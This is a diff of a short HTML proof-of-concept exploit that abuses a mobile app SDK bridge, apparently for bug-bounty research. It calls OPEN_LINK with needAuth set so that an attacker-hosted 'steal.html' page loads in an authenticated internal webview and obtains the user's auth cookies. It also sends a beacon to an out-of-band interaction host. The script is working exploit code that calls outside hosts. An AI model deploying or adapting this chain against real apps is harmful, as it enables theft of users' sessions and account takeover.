@@ -1,22 +1,21 @@
-<html><head><title>PoC 2</title></head>
+<html><head><title>PoC</title></head>
 <body>
 <script>
-// OPEN_LINK with openType:"IN" + needAuth:true
-// This should open our URL in an INTERNAL authenticated webview
-// Our page will then have access to auth cookies and can make API calls
+// Stage 1: Open our second page in the authenticated webview
+// The second page will have cookies injected and can make API calls
 
 window.__plusSDKMobileCompat.onMessage(JSON.stringify({
   type: "OPEN_LINK",
-  trackId: "in-auth",
+  trackId: "chain",
   payload: {
-    url: "https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/in-auth-test",
+    url: "https://0xem8.github.io/r4dl337.github.io/steal.html",
     urlType: "WEBLINK",
     openType: "IN",
     needAuth: true
   }
 }));
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/in-auth-sent");
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/chain-sent");
 </script>
 </body>
 </html>
